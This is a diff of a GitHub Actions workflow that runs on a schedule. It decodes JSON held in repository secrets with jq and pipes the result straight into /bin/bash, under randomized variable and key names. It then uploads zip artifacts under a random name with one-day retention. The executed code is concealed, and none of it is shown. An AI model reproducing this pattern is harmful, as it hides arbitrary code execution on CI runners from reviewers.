@@ -1,26 +1,26 @@
 name: kongbaoxutie
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '56 5/6 * * *'
 
-jobs:  # 32706
+  schedule:
+    - cron: '10 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kongbaoxutie
         env:
-          pexl8: ${{ secrets.pexl8 }}
+          rmjec59301: ${{ secrets.rmjec59301 }}
         run: |
-          echo $pexl8 | jq -r .qlbw0 | /bin/bash
-          echo $fs6 | jq -r .zvh09862 | /bin/bash
-          echo $a8 | jq -r .mmpy31455 | /bin/bash
-          echo $avyat16 | jq -r .u8 | /bin/bash
-          echo $zs3473 | jq -r .uaxtv5684 | /bin/bash
-          echo $apa41 | jq -r .jbwze8242 | /bin/bash
-          echo $cqzw607 | jq -r .xsex66357 | /bin/bash
-          echo $a2844 | jq -r .gd6949 | /bin/bash
+          printf '%s' "$rmjec59301" | jq -r .zj4 | /bin/bash
+          echo $fmxq19 | jq -r .y86 | /bin/bash
+          printf '%s' "$l6452" | jq -r .rmy5 | /bin/bash
+          printf '%s' "$wf322" | jq -r .pkuye4 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ldmGQlsM
+          path: "*.zip"
+          retention-days: 1
